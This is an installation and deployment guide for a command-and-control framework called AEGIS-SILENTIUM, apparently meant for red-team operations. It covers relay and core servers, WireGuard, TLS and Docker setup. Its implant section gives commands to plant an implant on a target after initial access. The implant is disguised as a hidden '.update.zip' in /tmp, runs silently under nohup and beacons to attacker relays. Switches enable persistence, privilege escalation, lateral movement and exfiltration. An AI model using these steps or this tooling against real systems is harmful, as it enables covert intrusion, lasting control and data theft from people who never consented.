# AEGIS-SILENTIUM v12 — Installation & Deployment Guide

> **AUTHORIZED USE ONLY.** Deploy only on infrastructure you own or have
> explicit written permission to use.

---

## Table of Contents

1. [Prerequisites](#prerequisites)
2. [Quick Start (Docker Compose)](#quick-start-docker-compose)
3. [Production Deployment](#production-deployment)
4. [Manual / Standalone Deployment](#manual--standalone-deployment)
5. [Implant Deployment](#implant-deployment)
6. [Post-Deployment Checklist](#post-deployment-checklist)
7. [Updating](#updating)
8. [Uninstall / Clean-up](#uninstall--clean-up)

---

## Prerequisites

### Operator Workstation

| Tool        | Minimum Version | Purpose                      |
|-------------|-----------------|------------------------------|
| Docker      | 24.x            | Run the full stack            |
| Docker Compose | 2.x          | Orchestrate services          |
| Go          | 1.22            | Build the relay binary        |
| Python      | 3.10            | Run the implant / C2 locally  |
| OpenSSL     | 1.1.1           | Certificate and key generation|
| WireGuard   | 1.0.x           | Relay ↔ core encrypted channel|
| `wg-tools`  | any             | WireGuard key generation      |

### Cloud / Server

| Component     | Recommended Spec           |
|---------------|----------------------------|
| Intelligence Core + DB | 2 vCPU, 4 GB RAM, Ubuntu 22.04 |
| Each Relay    | 1 vCPU, 512 MB RAM, Ubuntu 22.04 |
| PostgreSQL    | Included in Docker Compose |

---

## Quick Start (Docker Compose)

```bash
# 1. Clone the repository
git clone <your-fork-or-mirror> aegis-silentium
cd aegis-silentium

# 2. Generate TLS certificates
bash scripts/gen_certs.sh --out ./certs --relays 3 --days 90

# 3. Generate operator and WireGuard keys
bash scripts/gen_keys.sh --out ./keys --relays 3

# 4. Copy the env template and fill in secrets
cp .env.example .env
# Edit .env — fill in OPERATOR_KEY, DB_PASSWORD, COLUMN_ENC_KEY, etc.
# Paste the OPERATOR_PUBKEY_DER_B64 from keys/env_additions.txt

# 5. Start the full stack
docker compose -f deployment/docker-compose.silentium.yml up -d

# 6. Verify all services are healthy
docker compose -f deployment/docker-compose.silentium.yml ps
```

The dashboard will be available at `https://localhost:7331`.

---

## Production Deployment

### Step 1: Infrastructure

Provision at least:
- **1 core server** (VPN-only, not publicly reachable on port 5000)
- **3 relay servers** (publicly reachable on port 443)

Recommended: use Terraform to provision ephemeral relay VMs:
```bash
cd deployment/terraform
terraform init
terraform plan -var="relay_count=3" -var="aws_region=eu-west-1"
terraform apply
```

### Step 2: WireGuard

On the **core server**:
```bash
# Install WireGuard
apt install -y wireguard-tools

# Apply the generated config
bash scripts/setup_wireguard.sh --config keys/wireguard/wg0.conf.core
```

On each **relay server**:
```bash
# Install WireGuard
apt install -y wireguard-tools

# Deploy relay config (one per relay)
scp keys/wireguard/relay1_wg_private.key relay1:/etc/wireguard/
scp configs/relay1.yaml relay1:/config/relay.yaml
# Edit /etc/wireguard/wg0.conf on relay1 (see wireguard/wg0.conf.template)
wg-quick up wg0
```

### Step 3: TLS Certificates

Distribute certificates to each host:
```bash
# Core server
scp certs/ca/ca_cert.pem           core:/etc/aegis/tls/ca.pem
scp certs/core/core_cert.pem       core:/etc/aegis/tls/cert.pem
scp certs/core/core_key.pem        core:/etc/aegis/tls/key.pem

# Each relay (relay1 shown)
scp certs/relays/relay1_cert.pem   relay1:/etc/aegis/tls/cert.pem
scp certs/relays/relay1_key.pem    relay1:/etc/aegis/tls/key.pem
scp certs/clients/relay1_client_cert.pem relay1:/etc/aegis/tls/client.pem
scp certs/clients/relay1_client_key.pem  relay1:/etc/aegis/tls/client_key.pem
scp certs/ca/ca_cert.pem           relay1:/etc/aegis/tls/ca.pem
```

### Step 4: Build the Relay

```bash
bash scripts/build.sh --prod --platform linux/amd64 --out ./dist

# Deploy to each relay server
scp dist/relay/relay relay1:/usr/local/bin/aegis-relay
chmod +x /usr/local/bin/aegis-relay
```

### Step 5: Start Services

**On the core server** (using Docker Compose):
```bash
docker compose -f deployment/docker-compose.silentium.yml up -d postgres core scheduler dashboard
```

**On each relay server** (native binary):
```bash
# Start relay as a systemd service (recommended for production)
cat > /etc/systemd/system/aegis-relay.service << 'UNIT'
[Unit]
Description=AEGIS-SILENTIUM Relay
After=network-online.target wg-quick@wg0.service
Wants=network-online.target

[Service]
Type=simple
User=aegis
ExecStart=/usr/local/bin/aegis-relay --config /config/relay.yaml
Restart=on-failure
RestartSec=5
LimitNOFILE=65535
NoNewPrivileges=yes
ProtectSystem=strict
ReadWritePaths=/var/log/aegis
PrivateTmp=yes

[Install]
WantedBy=multi-user.target
UNIT

systemctl daemon-reload
systemctl enable aegis-relay
systemctl start aegis-relay
```

### Step 6: Verify Deployment

```bash
# Check relay health
curl -sk https://relay1.example.com/health
# Expected: {"status":"ok","relay_id":"relay1"}

# Check core health (from a WireGuard-connected host)
curl -s http://10.99.0.1:5000/health
# Expected: {"status":"ok","version":"5.0"}

# Check dashboard
curl -sk -H "X-Operator-Key: $OPERATOR_KEY" https://localhost:7331/
```

---

## Manual / Standalone Deployment

For environments without Docker:

```bash
# Install Python dependencies
pip install -r requirements.txt --break-system-packages

# Set up PostgreSQL manually
sudo -u postgres psql -c "CREATE USER aegis WITH PASSWORD 'CHANGE_THIS';"
sudo -u postgres psql -c "CREATE DATABASE aegis_silentium OWNER aegis;"
psql "postgresql://aegis:CHANGE_THIS@localhost/aegis_silentium" -f deployment/init.sql

# Start the C2 core
export DATABASE_URL="postgresql://aegis:CHANGE_THIS@localhost/aegis_silentium"
export AEGIS_OPERATOR_KEY="your-operator-key"
export FLASK_ENV="production"
python3 c2/app.py

# Start the dashboard (in another terminal)
export C2_URL="http://localhost:5000"
python3 dashboard/app.py

# Start the scheduler (in another terminal)
python3 scheduler/app.py
```

---

## Implant Deployment

The implant (`node/app.py`) runs on target systems.

### Minimum viable deployment

```bash
# On the target (after gaining initial access)
# Transfer the implant package
scp dist/implant/silentium-implant-5.0.zip target:/tmp/.update.zip
ssh target "cd /tmp && unzip -q .update.zip -d .sys && rm .update.zip"

# Start the implant (replace <RELAY_URL> and <NODE_ID>)
ssh target "C2_URLS='https://relay1.example.com:443' \
            NODE_ID='node-target01' \
            BEACON_INTERVAL=60 \
            nohup python3 /tmp/.sys/node/app.py > /dev/null 2>&1 &"
```

### Environment variables for the implant

```bash
# Required
export C2_URLS="https://relay1.example.com:443,https://relay2.example.com:8443"
export NODE_ID="node-$(hostname)-$(id -u)"

# Optional (default values shown)
export BEACON_INTERVAL=60
export BEACON_JITTER=0.3
export TRUST_THRESHOLD=40
export SCAN_TARGET="https://target.example.com"
export DOH_DOMAIN="data.your-operator-domain.com"

# Dangerous features — DISABLED by default
export ENABLE_PERSIST=false
export ENABLE_PRIVESC=false
export ENABLE_LATERAL=false
export ENABLE_OPSEC=false
export ENABLE_EXFIL=false
```

---

## Post-Deployment Checklist

After deployment, verify the following:

- [ ] All relay `/health` endpoints return `200 OK`
- [ ] Core `/health` returns `200 OK` (from WireGuard network only)
- [ ] Dashboard loads at `https://localhost:7331`
- [ ] Test implant registers and appears in `/api/nodes`
- [ ] ECDHE handshake completes (check relay logs for `[ecdhe] handshake ok`)
- [ ] PostgreSQL schema is present: `psql -c "\dt" aegis_silentium`
- [ ] Column encryption works: run a test scan and verify vuln `details` are BYTEA in DB
- [ ] WireGuard tunnel is up: `wg show wg0` shows relay peers
- [ ] TLS certs are valid: `openssl verify -CAfile certs/ca/ca_cert.pem certs/core/core_cert.pem`
- [ ] Operator key pair is backed up securely (offline, encrypted storage)

---

## Updating

```bash
# Pull latest changes
git pull origin main

# Rebuild binaries
bash scripts/build.sh --prod

# Rebuild Docker images
docker compose -f deployment/docker-compose.silentium.yml build

# Rolling restart (zero downtime for relays if load-balanced)
docker compose -f deployment/docker-compose.silentium.yml up -d --no-deps core
docker compose -f deployment/docker-compose.silentium.yml up -d --no-deps relay1

# Run any new migrations
psql "$DATABASE_URL" -f deployment/migrations/latest.sql   # if applicable
```

---

## Uninstall / Clean-up

```bash
# Stop all services
docker compose -f deployment/docker-compose.silentium.yml down -v

# Remove Docker images
docker rmi aegis-silentium/core:5.0 aegis-silentium/relay:5.0 \
           aegis-silentium/dashboard:5.0 aegis-silentium/scheduler:5.0

# Remove build artifacts
rm -rf dist/ keys/ certs/ .env

# Remove WireGuard interfaces (on relay/core servers)
wg-quick down wg0
systemctl disable aegis-relay

# Drop the database
sudo -u postgres psql -c "DROP DATABASE aegis_silentium;"
sudo -u postgres psql -c "DROP USER aegis;"

# Remove implants (from target systems — run via core if nodes are live)
bash scripts/inject_objective.sh --key keys/operator/operator_key.pem \
    --relay https://relay1.example.com:443 \
    --cmd kill_all
```

> **Operator responsibility:** Ensure all implants are removed and all
> exfiltrated data is properly handled according to your engagement rules
> of engagement before closing out an exercise.
